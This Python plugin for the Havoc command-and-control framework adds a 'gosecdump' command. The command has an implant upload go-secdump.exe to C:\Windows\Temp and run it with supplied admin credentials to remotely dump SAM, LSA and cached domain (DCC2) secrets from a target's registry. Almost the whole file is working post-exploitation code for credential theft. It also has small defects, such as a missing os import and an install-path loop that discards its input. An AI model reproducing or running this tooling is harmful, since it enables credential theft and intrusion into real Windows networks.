from havoc import Demon, RegisterCommand
from os import path

gosecdump_current_dir = os.getcwd()
gosecdump_install_path = "/data/extensions/havoc-gosecdump/"
while not os.path.exists(gosecdump_current_dir + gosecdump_install_path):
    # not installed through havoc-store so prompt for the path
    gosecdump_install_path = ""
    havocui.inputdialog("Install path", "Please enter your install path here for the module to work correctly:")
AGENT_BIN = gosecdump_current_dir + gosecdump_install_path + "go-secdump.exe"

def gosecdump(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()

    demon  = Demon(demonID)

    if len(param) < 4:
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR,
            "Not enough arguments please set host, username, password and --lsa/--sam/--dcc2",
        )
        return False

    host        = param[0]
    username    = param[1]
    password    = param[2]
    to_dump     = param[3]

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "x86 is not supported")
        return False

    if not path.isfile(AGENT_BIN):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Could not find go-secdump binary. Please install it here or update the script: {AGENT_BIN}")
        return False


    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Uploading and running go-secdump.exe")
    demon.Command(TaskID, "cd c:\\windows\\Temp")
    demon.Command(TaskID, f"upload {AGENT_BIN}")
    demon.Command(TaskID, f"shell c:\\windows\\Temp\\go-secdump.exe --host {host} --user {username} --pass {password} {to_dump}")

    return TaskID

RegisterCommand(gosecdump, "", "gosecdump", "Tool to remotely dump secrets from the Windows registry (SAM,LSA, DCC2)", 4, "Target Admin-user Admin-password --sam/--lsa/--dcc2 (args)", "")